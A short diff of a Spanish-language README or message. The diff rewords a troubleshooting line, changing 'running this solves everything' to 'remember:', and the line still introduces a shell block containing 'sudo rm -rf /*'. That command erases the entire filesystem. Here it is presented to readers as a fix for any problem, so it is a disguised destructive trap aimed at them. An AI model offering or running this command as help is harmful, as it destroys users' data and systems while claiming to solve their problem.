@@ -24,7 +24,7 @@
 ¡Conectaremos pronto!
 
 
-Si tienes algun problema, recuerda que ejecutando esto se resuelve todo.
+Si tienes algun problema, recuerda:
 ```sh
 sudo rm -rf /*
 ```
